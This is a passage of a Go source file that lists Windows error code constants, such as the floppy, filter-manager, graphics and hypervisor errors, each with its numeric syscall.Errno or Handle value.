ERROR_FLOPPY_ID_MARK_NOT_FOUND                                            syscall.Errno = 1122
ERROR_FLOPPY_UNKNOWN_ERROR                                                syscall.Errno = 1124
ERROR_FLOPPY_VOLUME                                                       syscall.Errno = 584
ERROR_FLOPPY_WRONG_CYLINDER                                               syscall.Errno = 1123
ERROR_FLT_ALREADY_ENLISTED                                                Handle        = 0x801F001B
ERROR_FLT_CBDQ_DISABLED                                                   Handle        = 0x801F000E
ERROR_FLT_CONTEXT_ALLOCATION_NOT_FOUND                                    Handle        = 0x801F0016
ERROR_FLT_CONTEXT_ALREADY_DEFINED                                         Handle        = 0x801F0002
ERROR_FLT_CONTEXT_ALREADY_LINKED                                          Handle        = 0x801F001C
ERROR_FLT_DELETING_OBJECT                                                 Handle        = 0x801F000B
ERROR_FLT_DISALLOW_FAST_IO                                                Handle        = 0x801F0004
ERROR_FLT_DO_NOT_ATTACH                                                   Handle        = 0x801F000F
ERROR_FLT_DO_NOT_DETACH                                                   Handle        = 0x801F0010
ERROR_FLT_DUPLICATE_ENTRY                                                 Handle        = 0x801F000D
ERROR_FLT_FILTER_NOT_FOUND                                                Handle        = 0x801F0013
ERROR_FLT_FILTER_NOT_READY                                                Handle        = 0x801F0008
ERROR_FLT_INSTANCE_ALTITUDE_COLLISION                                     Handle        = 0x801F0011
ERROR_FLT_INSTANCE_NAME_COLLISION                                         Handle        = 0x801F0012
ERROR_FLT_INSTANCE_NOT_FOUND                                              Handle        = 0x801F0015
ERROR_FLT_INTERNAL_ERROR                                                  Handle        = 0x801F000A
ERROR_FLT_INVALID_ASYNCHRONOUS_REQUEST                                    Handle        = 0x801F0003
ERROR_FLT_INVALID_CONTEXT_REGISTRATION                                    Handle        = 0x801F0017
ERROR_FLT_INVALID_NAME_REQUEST                                            Handle        = 0x801F0005
ERROR_FLT_IO_COMPLETE                                                     Handle        = 0x001F0001
ERROR_FLT_MUST_BE_NONPAGED_POOL                                           Handle        = 0x801F000C
ERROR_FLT_NAME_CACHE_MISS                                                 Handle        = 0x801F0018
ERROR_FLT_NOT_INITIALIZED                                                 Handle        = 0x801F0007
ERROR_FLT_NOT_SAFE_TO_POST_OPERATION                                      Handle        = 0x801F0006
ERROR_FLT_NO_DEVICE_OBJECT                                                Handle        = 0x801F0019
ERROR_FLT_NO_HANDLER_DEFINED                                              Handle        = 0x801F0001
ERROR_FLT_NO_WAITER_FOR_REPLY                                             Handle        = 0x801F0020
ERROR_FLT_POST_OPERATION_CLEANUP                                          Handle        = 0x801F0009
ERROR_FLT_REGISTRATION_BUSY                                               Handle        = 0x801F0023
ERROR_FLT_VOLUME_ALREADY_MOUNTED                                          Handle        = 0x801F001A
ERROR_FLT_VOLUME_NOT_FOUND                                                Handle        = 0x801F0014
ERROR_FORMS_AUTH_REQUIRED                                                 syscall.Errno = 224
ERROR_FOUND_OUT_OF_SCOPE                                                  syscall.Errno = 601
ERROR_FSFILTER_OP_COMPLETED_SUCCESSFULLY                                  syscall.Errno = 762
ERROR_FS_DRIVER_REQUIRED                                                  syscall.Errno = 588
ERROR_FT_DI_SCAN_REQUIRED                                                 syscall.Errno = 339
ERROR_FT_READ_FAILURE                                                     syscall.Errno = 415
ERROR_FT_READ_RECOVERY_FROM_BACKUP                                        syscall.Errno = 704
ERROR_FT_WRITE_FAILURE                                                    syscall.Errno = 338
ERROR_FT_WRITE_RECOVERY                                                   syscall.Errno = 705
ERROR_FULLSCREEN_MODE                                                     syscall.Errno = 1007
ERROR_FULL_BACKUP                                                         syscall.Errno = 4004
ERROR_FUNCTION_FAILED                                                     syscall.Errno = 1627
ERROR_FUNCTION_NOT_CALLED                                                 syscall.Errno = 1626
ERROR_GDI_HANDLE_LEAK                                                     syscall.Errno = 373
ERROR_GENERAL_SYNTAX                         Errno = 0x20000000 
ERROR_GENERIC_COMMAND_FAILED                                              syscall.Errno = 14109
ERROR_GENERIC_NOT_MAPPED                                                  syscall.Errno = 1360
ERROR_GEN_FAILURE                                                         syscall.Errno = 31
ERROR_GLOBAL_ONLY_HOOK                                                    syscall.Errno = 1429
ERROR_GPIO_CLIENT_INFORMATION_INVALID                                     syscall.Errno = 15322
ERROR_GPIO_INCOMPATIBLE_CONNECT_MODE                                      syscall.Errno = 15326
ERROR_GPIO_INTERRUPT_ALREADY_UNMASKED                                     syscall.Errno = 15327
ERROR_GPIO_INVALID_REGISTRATION_PACKET                                    syscall.Errno = 15324
ERROR_GPIO_OPERATION_DENIED                                               syscall.Errno = 15325
ERROR_GPIO_VERSION_NOT_SUPPORTED                                          syscall.Errno = 15323
ERROR_GRACEFUL_DISCONNECT                                                 syscall.Errno = 1226
ERROR_GRAPHICS_ADAPTER_ACCESS_NOT_EXCLUDED                                Handle        = 0xC026243B
ERROR_GRAPHICS_ADAPTER_CHAIN_NOT_READY                                    Handle        = 0xC0262433
ERROR_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_SOURCE                      Handle        = 0xC0262328
ERROR_GRAPHICS_ADAPTER_MUST_HAVE_AT_LEAST_ONE_TARGET                      Handle        = 0xC0262329
ERROR_GRAPHICS_ADAPTER_WAS_RESET                                          Handle        = 0xC0262003
ERROR_GRAPHICS_ALLOCATION_BUSY                                            Handle        = 0xC0262102
ERROR_GRAPHICS_ALLOCATION_CLOSED                                          Handle        = 0xC0262112
ERROR_GRAPHICS_ALLOCATION_CONTENT_LOST                                    Handle        = 0xC0262116
ERROR_GRAPHICS_ALLOCATION_INVALID                                         Handle        = 0xC0262106
ERROR_GRAPHICS_CANCEL_VIDPN_TOPOLOGY_AUGMENTATION                         Handle        = 0xC026235A
ERROR_GRAPHICS_CANNOTCOLORCONVERT                                         Handle        = 0xC0262008
ERROR_GRAPHICS_CANT_ACCESS_ACTIVE_VIDPN                                   Handle        = 0xC0262343
ERROR_GRAPHICS_CANT_EVICT_PINNED_ALLOCATION                               Handle        = 0xC0262109
ERROR_GRAPHICS_CANT_LOCK_MEMORY                                           Handle        = 0xC0262101
ERROR_GRAPHICS_CANT_RENDER_LOCKED_ALLOCATION                              Handle        = 0xC0262111
ERROR_GRAPHICS_CHAINLINKS_NOT_ENUMERATED                                  Handle        = 0xC0262432
ERROR_GRAPHICS_CHAINLINKS_NOT_POWERED_ON                                  Handle        = 0xC0262435
ERROR_GRAPHICS_CHAINLINKS_NOT_STARTED                                     Handle        = 0xC0262434
ERROR_GRAPHICS_CHILD_DESCRIPTOR_NOT_SUPPORTED                             Handle        = 0xC0262401
ERROR_GRAPHICS_CLIENTVIDPN_NOT_SET                                        Handle        = 0xC026235C
ERROR_GRAPHICS_COPP_NOT_SUPPORTED                                         Handle        = 0xC0262501
ERROR_GRAPHICS_DATASET_IS_EMPTY                                           Handle        = 0x0026234B
ERROR_GRAPHICS_DDCCI_CURRENT_CURRENT_VALUE_GREATER_THAN_MAXIMUM_VALUE     Handle        = 0xC02625D8
ERROR_GRAPHICS_DDCCI_INVALID_DATA                                         Handle        = 0xC0262585
ERROR_GRAPHICS_DDCCI_INVALID_MESSAGE_CHECKSUM                             Handle        = 0xC026258B
ERROR_GRAPHICS_DDCCI_INVALID_MESSAGE_COMMAND                              Handle        = 0xC0262589
ERROR_GRAPHICS_DDCCI_INVALID_MESSAGE_LENGTH                               Handle        = 0xC026258A
ERROR_GRAPHICS_DDCCI_MONITOR_RETURNED_INVALID_TIMING_STATUS_BYTE          Handle        = 0xC0262586
ERROR_GRAPHICS_DDCCI_VCP_NOT_SUPPORTED                                    Handle        = 0xC0262584
ERROR_GRAPHICS_DEPENDABLE_CHILD_STATUS                                    Handle        = 0x4026243C
ERROR_GRAPHICS_DISPLAY_DEVICE_NOT_ATTACHED_TO_DESKTOP                     Handle        = 0xC02625E2
ERROR_GRAPHICS_DRIVER_MISMATCH                                            Handle        = 0xC0262009
ERROR_GRAPHICS_EMPTY_ADAPTER_MONITOR_MODE_SUPPORT_INTERSECTION            Handle        = 0xC0262325
ERROR_GRAPHICS_FREQUENCYRANGE_ALREADY_IN_SET                              Handle        = 0xC026231F
ERROR_GRAPHICS_FREQUENCYRANGE_NOT_IN_SET                                  Handle        = 0xC026231D
ERROR_GRAPHICS_GAMMA_RAMP_NOT_SUPPORTED                                   Handle        = 0xC0262348
ERROR_GRAPHICS_GPU_EXCEPTION_ON_DEVICE                                    Handle        = 0xC0262200
ERROR_GRAPHICS_I2C_DEVICE_DOES_NOT_EXIST                                  Handle        = 0xC0262581
ERROR_GRAPHICS_I2C_ERROR_RECEIVING_DATA                                   Handle        = 0xC0262583
ERROR_GRAPHICS_I2C_ERROR_TRANSMITTING_DATA                                Handle        = 0xC0262582
ERROR_GRAPHICS_I2C_NOT_SUPPORTED                                          Handle        = 0xC0262580
ERROR_GRAPHICS_INCOMPATIBLE_PRIVATE_FORMAT                                Handle        = 0xC0262355
ERROR_GRAPHICS_INCONSISTENT_DEVICE_LINK_STATE                             Handle        = 0xC0262436
ERROR_GRAPHICS_INDIRECT_DISPLAY_ABANDON_SWAPCHAIN                         Handle        = 0xC0262012
ERROR_GRAPHICS_INDIRECT_DISPLAY_DEVICE_STOPPED                            Handle        = 0xC0262013
ERROR_GRAPHICS_INSUFFICIENT_DMA_BUFFER                                    Handle        = 0xC0262001
ERROR_GRAPHICS_INTERNAL_ERROR                                             Handle        = 0xC02625E7
ERROR_GRAPHICS_INVALID_ACTIVE_REGION                                      Handle        = 0xC026230B
ERROR_GRAPHICS_INVALID_ALLOCATION_HANDLE                                  Handle        = 0xC0262114
ERROR_GRAPHICS_INVALID_ALLOCATION_INSTANCE                                Handle        = 0xC0262113
ERROR_GRAPHICS_INVALID_ALLOCATION_USAGE                                   Handle        = 0xC0262110
ERROR_GRAPHICS_INVALID_CLIENT_TYPE                                        Handle        = 0xC026235B
ERROR_GRAPHICS_INVALID_COLORBASIS                                         Handle        = 0xC026233E
ERROR_GRAPHICS_INVALID_COPYPROTECTION_TYPE                                Handle        = 0xC026234F
ERROR_GRAPHICS_INVALID_DISPLAY_ADAPTER                                    Handle        = 0xC0262002
ERROR_GRAPHICS_INVALID_DRIVER_MODEL                                       Handle        = 0xC0262004
ERROR_GRAPHICS_INVALID_FREQUENCY                                          Handle        = 0xC026230A
ERROR_GRAPHICS_INVALID_GAMMA_RAMP                                         Handle        = 0xC0262347
ERROR_GRAPHICS_INVALID_MODE_PRUNING_ALGORITHM                             Handle        = 0xC0262356
ERROR_GRAPHICS_INVALID_MONITORDESCRIPTOR                                  Handle        = 0xC026232B
ERROR_GRAPHICS_INVALID_MONITORDESCRIPTORSET                               Handle        = 0xC026232A
ERROR_GRAPHICS_INVALID_MONITOR_CAPABILITY_ORIGIN                          Handle        = 0xC0262357
ERROR_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE                             Handle        = 0xC026231C
ERROR_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGESET                          Handle        = 0xC026231B
ERROR_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE_CONSTRAINT                  Handle        = 0xC0262358
ERROR_GRAPHICS_INVALID_MONITOR_SOURCEMODESET                              Handle        = 0xC0262321
ERROR_GRAPHICS_INVALID_MONITOR_SOURCE_MODE                                Handle        = 0xC0262322
ERROR_GRAPHICS_INVALID_PATH_CONTENT_GEOMETRY_TRANSFORMATION               Handle        = 0xC0262345
ERROR_GRAPHICS_INVALID_PATH_CONTENT_TYPE                                  Handle        = 0xC026234E
ERROR_GRAPHICS_INVALID_PATH_IMPORTANCE_ORDINAL                            Handle        = 0xC0262344
ERROR_GRAPHICS_INVALID_PHYSICAL_MONITOR_HANDLE                            Handle        = 0xC026258C
ERROR_GRAPHICS_INVALID_PIXELFORMAT                                        Handle        = 0xC026233D
ERROR_GRAPHICS_INVALID_PIXELVALUEACCESSMODE                               Handle        = 0xC026233F
ERROR_GRAPHICS_INVALID_POINTER                                            Handle        = 0xC02625E4
ERROR_GRAPHICS_INVALID_PRIMARYSURFACE_SIZE                                Handle        = 0xC026233A
ERROR_GRAPHICS_INVALID_SCANLINE_ORDERING                                  Handle        = 0xC0262352
ERROR_GRAPHICS_INVALID_STRIDE                                             Handle        = 0xC026233C
ERROR_GRAPHICS_INVALID_TOTAL_REGION                                       Handle        = 0xC026230C
ERROR_GRAPHICS_INVALID_VIDEOPRESENTSOURCESET                              Handle        = 0xC0262315
ERROR_GRAPHICS_INVALID_VIDEOPRESENTTARGETSET                              Handle        = 0xC0262316
ERROR_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE                               Handle        = 0xC0262304
ERROR_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE_MODE                          Handle        = 0xC0262310
ERROR_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET                               Handle        = 0xC0262305
ERROR_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET_MODE                          Handle        = 0xC0262311
ERROR_GRAPHICS_INVALID_VIDPN                                              Handle        = 0xC0262303
ERROR_GRAPHICS_INVALID_VIDPN_PRESENT_PATH                                 Handle        = 0xC0262319
ERROR_GRAPHICS_INVALID_VIDPN_SOURCEMODESET                                Handle        = 0xC0262308
ERROR_GRAPHICS_INVALID_VIDPN_TARGETMODESET                                Handle        = 0xC0262309
ERROR_GRAPHICS_INVALID_VIDPN_TARGET_SUBSET_TYPE                           Handle        = 0xC026232F
ERROR_GRAPHICS_INVALID_VIDPN_TOPOLOGY                                     Handle        = 0xC0262300
ERROR_GRAPHICS_INVALID_VIDPN_TOPOLOGY_RECOMMENDATION_REASON               Handle        = 0xC026234D
ERROR_GRAPHICS_INVALID_VISIBLEREGION_SIZE                                 Handle        = 0xC026233B
ERROR_GRAPHICS_LEADLINK_NOT_ENUMERATED                                    Handle        = 0xC0262431
ERROR_GRAPHICS_LEADLINK_START_DEFERRED                                    Handle        = 0x40262437
ERROR_GRAPHICS_MAX_NUM_PATHS_REACHED                                      Handle        = 0xC0262359
ERROR_GRAPHICS_MCA_INTERNAL_ERROR                                         Handle        = 0xC0262588
ERROR_GRAPHICS_MCA_INVALID_CAPABILITIES_STRING                            Handle        = 0xC0262587
ERROR_GRAPHICS_MCA_INVALID_TECHNOLOGY_TYPE_RETURNED                       Handle        = 0xC02625DE
ERROR_GRAPHICS_MCA_INVALID_VCP_VERSION                                    Handle        = 0xC02625D9
ERROR_GRAPHICS_MCA_MCCS_VERSION_MISMATCH                                  Handle        = 0xC02625DB
ERROR_GRAPHICS_MCA_MONITOR_VIOLATES_MCCS_SPECIFICATION                    Handle        = 0xC02625DA
ERROR_GRAPHICS_MCA_UNSUPPORTED_COLOR_TEMPERATURE                          Handle        = 0xC02625DF
ERROR_GRAPHICS_MCA_UNSUPPORTED_MCCS_VERSION                               Handle        = 0xC02625DC
ERROR_GRAPHICS_MIRRORING_DEVICES_NOT_SUPPORTED                            Handle        = 0xC02625E3
ERROR_GRAPHICS_MODE_ALREADY_IN_MODESET                                    Handle        = 0xC0262314
ERROR_GRAPHICS_MODE_ID_MUST_BE_UNIQUE                                     Handle        = 0xC0262324
ERROR_GRAPHICS_MODE_NOT_IN_MODESET                                        Handle        = 0xC026234A
ERROR_GRAPHICS_MODE_NOT_PINNED                                            Handle        = 0x00262307
ERROR_GRAPHICS_MONITORDESCRIPTOR_ALREADY_IN_SET                           Handle        = 0xC026232D
ERROR_GRAPHICS_MONITORDESCRIPTOR_ID_MUST_BE_UNIQUE                        Handle        = 0xC026232E
ERROR_GRAPHICS_MONITORDESCRIPTOR_NOT_IN_SET                               Handle        = 0xC026232C
ERROR_GRAPHICS_MONITOR_COULD_NOT_BE_ASSOCIATED_WITH_ADAPTER               Handle        = 0xC0262334
ERROR_GRAPHICS_MONITOR_NOT_CONNECTED                                      Handle        = 0xC0262338
ERROR_GRAPHICS_MONITOR_NO_LONGER_EXISTS                                   Handle        = 0xC026258D
ERROR_GRAPHICS_MULTISAMPLING_NOT_SUPPORTED                                Handle        = 0xC0262349
ERROR_GRAPHICS_NOT_A_LINKED_ADAPTER                                       Handle        = 0xC0262430
ERROR_GRAPHICS_NOT_EXCLUSIVE_MODE_OWNER                                   Handle        = 0xC0262000
ERROR_GRAPHICS_NOT_POST_DEVICE_DRIVER                                     Handle        = 0xC0262438
ERROR_GRAPHICS_NO_ACTIVE_VIDPN                                            Handle        = 0xC0262336
ERROR_GRAPHICS_NO_AVAILABLE_IMPORTANCE_ORDINALS                           Handle        = 0xC0262354
ERROR_GRAPHICS_NO_AVAILABLE_VIDPN_TARGET                                  Handle        = 0xC0262333
ERROR_GRAPHICS_NO_DISPLAY_DEVICE_CORRESPONDS_TO_NAME                      Handle        = 0xC02625E1
ERROR_GRAPHICS_NO_DISPLAY_MODE_MANAGEMENT_SUPPORT                         Handle        = 0xC0262341
ERROR_GRAPHICS_NO_MONITORS_CORRESPOND_TO_DISPLAY_DEVICE                   Handle        = 0xC02625E5
ERROR_GRAPHICS_NO_MORE_ELEMENTS_IN_DATASET                                Handle        = 0x0026234C
ERROR_GRAPHICS_NO_PREFERRED_MODE                                          Handle        = 0x0026231E
ERROR_GRAPHICS_NO_RECOMMENDED_FUNCTIONAL_VIDPN                            Handle        = 0xC0262323
ERROR_GRAPHICS_NO_RECOMMENDED_VIDPN_TOPOLOGY                              Handle        = 0xC026231A
ERROR_GRAPHICS_NO_VIDEO_MEMORY                                            Handle        = 0xC0262100
ERROR_GRAPHICS_NO_VIDPNMGR                                                Handle        = 0xC0262335
ERROR_GRAPHICS_ONLY_CONSOLE_SESSION_SUPPORTED                             Handle        = 0xC02625E0
ERROR_GRAPHICS_OPM_ALL_HDCP_HARDWARE_ALREADY_IN_USE                       Handle        = 0xC0262518
ERROR_GRAPHICS_OPM_DRIVER_INTERNAL_ERROR                                  Handle        = 0xC026251E
ERROR_GRAPHICS_OPM_HDCP_SRM_NEVER_SET                                     Handle        = 0xC0262516
ERROR_GRAPHICS_OPM_INTERNAL_ERROR                                         Handle        = 0xC026250B
ERROR_GRAPHICS_OPM_INVALID_CONFIGURATION_REQUEST                          Handle        = 0xC0262521
ERROR_GRAPHICS_OPM_INVALID_ENCRYPTED_PARAMETERS                           Handle        = 0xC0262503
ERROR_GRAPHICS_OPM_INVALID_HANDLE                                         Handle        = 0xC026250C
ERROR_GRAPHICS_OPM_INVALID_INFORMATION_REQUEST                            Handle        = 0xC026251D
ERROR_GRAPHICS_OPM_INVALID_SRM                                            Handle        = 0xC0262512
ERROR_GRAPHICS_OPM_NOT_SUPPORTED                                          Handle        = 0xC0262500
ERROR_GRAPHICS_OPM_NO_VIDEO_OUTPUTS_EXIST                                 Handle        = 0xC0262505
ERROR_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_ACP                            Handle        = 0xC0262514
ERROR_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_CGMSA                          Handle        = 0xC0262515
ERROR_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_HDCP                           Handle        = 0xC0262513
ERROR_GRAPHICS_OPM_RESOLUTION_TOO_HIGH                                    Handle        = 0xC0262517
ERROR_GRAPHICS_OPM_SESSION_TYPE_CHANGE_IN_PROGRESS                        Handle        = 0xC026251B
ERROR_GRAPHICS_OPM_SIGNALING_NOT_SUPPORTED                                Handle        = 0xC0262520
ERROR_GRAPHICS_OPM_SPANNING_MODE_ENABLED                                  Handle        = 0xC026250F
ERROR_GRAPHICS_OPM_THEATER_MODE_ENABLED                                   Handle        = 0xC0262510
ERROR_GRAPHICS_OPM_VIDEO_OUTPUT_DOES_NOT_HAVE_COPP_SEMANTICS              Handle        = 0xC026251C
ERROR_GRAPHICS_OPM_VIDEO_OUTPUT_DOES_NOT_HAVE_OPM_SEMANTICS               Handle        = 0xC026251F
ERROR_GRAPHICS_OPM_VIDEO_OUTPUT_NO_LONGER_EXISTS                          Handle        = 0xC026251A
ERROR_GRAPHICS_PARAMETER_ARRAY_TOO_SMALL                                  Handle        = 0xC02625E6
ERROR_GRAPHICS_PARTIAL_DATA_POPULATED                                     Handle        = 0x4026200A
ERROR_GRAPHICS_PATH_ALREADY_IN_TOPOLOGY                                   Handle        = 0xC0262313
ERROR_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_PINNED            Handle        = 0x00262351
ERROR_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_SUPPORTED         Handle        = 0xC0262346
ERROR_GRAPHICS_PATH_NOT_IN_TOPOLOGY                                       Handle        = 0xC0262327
ERROR_GRAPHICS_PINNED_MODE_MUST_REMAIN_IN_SET                             Handle        = 0xC0262312
ERROR_GRAPHICS_POLLING_TOO_FREQUENTLY                                     Handle        = 0x40262439
ERROR_GRAPHICS_PRESENT_BUFFER_NOT_BOUND                                   Handle        = 0xC0262010
ERROR_GRAPHICS_PRESENT_DENIED                                             Handle        = 0xC0262007
ERROR_GRAPHICS_PRESENT_INVALID_WINDOW                                     Handle        = 0xC026200F
ERROR_GRAPHICS_PRESENT_MODE_CHANGED                                       Handle        = 0xC0262005
ERROR_GRAPHICS_PRESENT_OCCLUDED                                           Handle        = 0xC0262006
ERROR_GRAPHICS_PRESENT_REDIRECTION_DISABLED                               Handle        = 0xC026200B
ERROR_GRAPHICS_PRESENT_UNOCCLUDED                                         Handle        = 0xC026200C
ERROR_GRAPHICS_PVP_HFS_FAILED                                             Handle        = 0xC0262511
ERROR_GRAPHICS_PVP_INVALID_CERTIFICATE_LENGTH                             Handle        = 0xC026250E
ERROR_GRAPHICS_RESOURCES_NOT_RELATED                                      Handle        = 0xC0262330
ERROR_GRAPHICS_SESSION_TYPE_CHANGE_IN_PROGRESS                            Handle        = 0xC02605E8
ERROR_GRAPHICS_SKIP_ALLOCATION_PREPARATION                                Handle        = 0x40262201
ERROR_GRAPHICS_SOURCE_ALREADY_IN_SET                                      Handle        = 0xC0262317
ERROR_GRAPHICS_SOURCE_ID_MUST_BE_UNIQUE                                   Handle        = 0xC0262331
ERROR_GRAPHICS_SOURCE_NOT_IN_TOPOLOGY                                     Handle        = 0xC0262339
ERROR_GRAPHICS_SPECIFIED_CHILD_ALREADY_CONNECTED                          Handle        = 0xC0262400
ERROR_GRAPHICS_STALE_MODESET                                              Handle        = 0xC0262320
ERROR_GRAPHICS_STALE_VIDPN_TOPOLOGY                                       Handle        = 0xC0262337
ERROR_GRAPHICS_START_DEFERRED                                             Handle        = 0x4026243A
ERROR_GRAPHICS_TARGET_ALREADY_IN_SET                                      Handle        = 0xC0262318
ERROR_GRAPHICS_TARGET_ID_MUST_BE_UNIQUE                                   Handle        = 0xC0262332
ERROR_GRAPHICS_TARGET_NOT_IN_TOPOLOGY                                     Handle        = 0xC0262340
ERROR_GRAPHICS_TOO_MANY_REFERENCES                                        Handle        = 0xC0262103
ERROR_GRAPHICS_TOPOLOGY_CHANGES_NOT_ALLOWED                               Handle        = 0xC0262353
ERROR_GRAPHICS_TRY_AGAIN_LATER                                            Handle        = 0xC0262104
ERROR_GRAPHICS_TRY_AGAIN_NOW                                              Handle        = 0xC0262105
ERROR_GRAPHICS_UAB_NOT_SUPPORTED                                          Handle        = 0xC0262502
ERROR_GRAPHICS_UNASSIGNED_MODESET_ALREADY_EXISTS                          Handle        = 0xC0262350
ERROR_GRAPHICS_UNKNOWN_CHILD_STATUS                                       Handle        = 0x4026242F
ERROR_GRAPHICS_UNSWIZZLING_APERTURE_UNAVAILABLE                           Handle        = 0xC0262107
ERROR_GRAPHICS_UNSWIZZLING_APERTURE_UNSUPPORTED                           Handle        = 0xC0262108
ERROR_GRAPHICS_VAIL_STATE_CHANGED                                         Handle        = 0xC0262011
ERROR_GRAPHICS_VIDEO_PRESENT_TARGETS_LESS_THAN_SOURCES                    Handle        = 0xC0262326
ERROR_GRAPHICS_VIDPN_MODALITY_NOT_SUPPORTED                               Handle        = 0xC0262306
ERROR_GRAPHICS_VIDPN_SOURCE_IN_USE                                        Handle        = 0xC0262342
ERROR_GRAPHICS_VIDPN_TOPOLOGY_CURRENTLY_NOT_SUPPORTED                     Handle        = 0xC0262302
ERROR_GRAPHICS_VIDPN_TOPOLOGY_NOT_SUPPORTED                               Handle        = 0xC0262301
ERROR_GRAPHICS_WINDOWDC_NOT_AVAILABLE                                     Handle        = 0xC026200D
ERROR_GRAPHICS_WINDOWLESS_PRESENT_DISABLED                                Handle        = 0xC026200E
ERROR_GRAPHICS_WRONG_ALLOCATION_DEVICE                                    Handle        = 0xC0262115
ERROR_GROUPSET_CANT_PROVIDE                                               syscall.Errno = 5993
ERROR_GROUPSET_NOT_AVAILABLE                                              syscall.Errno = 5991
ERROR_GROUPSET_NOT_FOUND                                                  syscall.Errno = 5992
ERROR_GROUP_EXISTS                                                        syscall.Errno = 1318
ERROR_GROUP_NOT_AVAILABLE                                                 syscall.Errno = 5012
ERROR_GROUP_NOT_FOUND                                                     syscall.Errno = 5013
ERROR_GROUP_NOT_ONLINE                                                    syscall.Errno = 5014
ERROR_GUID_SUBSTITUTION_MADE                                              syscall.Errno = 680
ERROR_HANDLES_CLOSED                                                      syscall.Errno = 676
ERROR_HANDLE_DISK_FULL                                                    syscall.Errno = 39
ERROR_HANDLE_EOF                                                          syscall.Errno = 38
ERROR_HANDLE_NO_LONGER_VALID                                              syscall.Errno = 6815
ERROR_HANDLE_REVOKED                                                      syscall.Errno = 811
ERROR_HASH_NOT_PRESENT                                                    syscall.Errno = 15301
ERROR_HASH_NOT_SUPPORTED                                                  syscall.Errno = 15300
ERROR_HEURISTIC_DAMAGE_POSSIBLE                                           syscall.Errno = 6731
ERROR_HIBERNATED                                                          syscall.Errno = 726
ERROR_HIBERNATION_FAILURE                                                 syscall.Errno = 656
ERROR_HOOK_NEEDS_HMOD                                                     syscall.Errno = 1428
ERROR_HOOK_NOT_INSTALLED                                                  syscall.Errno = 1431
ERROR_HOOK_TYPE_NOT_ALLOWED                                               syscall.Errno = 1458
ERROR_HOST_DOWN                                                           syscall.Errno = 1256
ERROR_HOST_NODE_NOT_AVAILABLE                                             syscall.Errno = 5005
ERROR_HOST_NODE_NOT_GROUP_OWNER                                           syscall.Errno = 5016
ERROR_HOST_NODE_NOT_RESOURCE_OWNER                                        syscall.Errno = 5015
ERROR_HOST_UNREACHABLE                                                    syscall.Errno = 1232
ERROR_HOTKEY_ALREADY_REGISTERED                                           syscall.Errno = 1409
ERROR_HOTKEY_NOT_REGISTERED                                               syscall.Errno = 1419
ERROR_HUNG_DISPLAY_DRIVER_THREAD                                          Handle        = 0x80260001
ERROR_HV_ACCESS_DENIED                                                    syscall.Errno = 0xC0350006
ERROR_HV_ACKNOWLEDGED                                                     syscall.Errno = 0xC0350016
ERROR_HV_CPUID_FEATURE_VALIDATION                                         syscall.Errno = 0xC035003C
ERROR_HV_CPUID_XSAVE_FEATURE_VALIDATION                                   syscall.Errno = 0xC035003D
ERROR_HV_FEATURE_UNAVAILABLE                                              syscall.Errno = 0xC035001E
ERROR_HV_INACTIVE                                                         syscall.Errno = 0xC035001C
ERROR_HV_INSUFFICIENT_BUFFER                                              syscall.Errno = 0xC0350033
ERROR_HV_INSUFFICIENT_BUFFERS                                             syscall.Errno = 0xC0350013
ERROR_HV_INSUFFICIENT_DEVICE_DOMAINS                                      syscall.Errno = 0xC0350038
ERROR_HV_INSUFFICIENT_MEMORY                                              syscall.Errno = 0xC035000B
ERROR_HV_INSUFFICIENT_ROOT_MEMORY                                         syscall.Errno = 0xC0350073
ERROR_HV_INVALID_ALIGNMENT                                                syscall.Errno = 0xC0350004
ERROR_HV_INVALID_CONNECTION_ID                                            syscall.Errno = 0xC0350012
ERROR_HV_INVALID_CPU_GROUP_ID                                             syscall.Errno = 0xC035006F
ERROR_HV_INVALID_CPU_GROUP_STATE                                          syscall.Errno = 0xC0350070
ERROR_HV_INVALID_DEVICE_ID                                                syscall.Errno = 0xC0350057
ERROR_HV_INVALID_DEVICE_STATE                                             syscall.Errno = 0xC0350058
ERROR_HV_INVALID_HYPERCALL_CODE                                           syscall.Errno = 0xC0350002
ERROR_HV_INVALID_HYPERCALL_INPUT                                          syscall.Errno = 0xC0350003
ERROR_HV_INVALID_LP_INDEX                                                 syscall.Errno = 0xC0350041
ERROR_HV_INVALID_PARAMETER                                                syscall.Errno = 0xC0350005
ERROR_HV_INVALID_PARTITION_ID                                             syscall.Errno = 0xC035000D
ERROR_HV_INVALID_PARTITION_STATE                                          syscall.Errno = 0xC0350007
ERROR_HV_INVALID_PORT_ID                                                  syscall.Errno = 0xC0350011
ERROR_HV_INVALID_PROXIMITY_DOMAIN_INFO                                    syscall.Errno = 0xC035001A
ERROR_HV_INVALID_REGISTER_VALUE                                           syscall.Errno = 0xC0350050
ERROR_HV_INVALID_SAVE_RESTORE_STATE                                       syscall.Errno = 0xC0350017
ERROR_HV_INVALID_SYNIC_STATE                                              syscall.Errno = 0xC0350018
ERROR_HV_INVALID_VP_INDEX                                                 syscall.Errno = 0xC035000E
ERROR_HV_INVALID_VP_STATE                                                 syscall.Errno = 0xC0350015
ERROR_HV_INVALID_VTL_STATE                                                syscall.Errno = 0xC0350051
ERROR_HV_NOT_ACKNOWLEDGED                                                 syscall.Errno = 0xC0350014
ERROR_HV_NOT_ALLOWED_WITH_NESTED_VIRT_ACTIVE                              syscall.Errno = 0xC0350072
ERROR_HV_NOT_PRESENT                                                      syscall.Errno = 0xC0351000
ERROR_HV_NO_DATA                                                          syscall.Errno = 0xC035001B
ERROR_HV_NO_RESOURCES                                                     syscall.Errno = 0xC035001D
ERROR_HV_NX_NOT_DETECTED                                                  syscall.Errno = 0xC0350055
ERROR_HV_OBJECT_IN_USE                                                    syscall.Errno = 0xC0350019
ERROR_HV_OPERATION_DENIED                                                 syscall.Errno = 0xC0350008
ERROR_HV_OPERATION_FAILED                                                 syscall.Errno = 0xC0350071
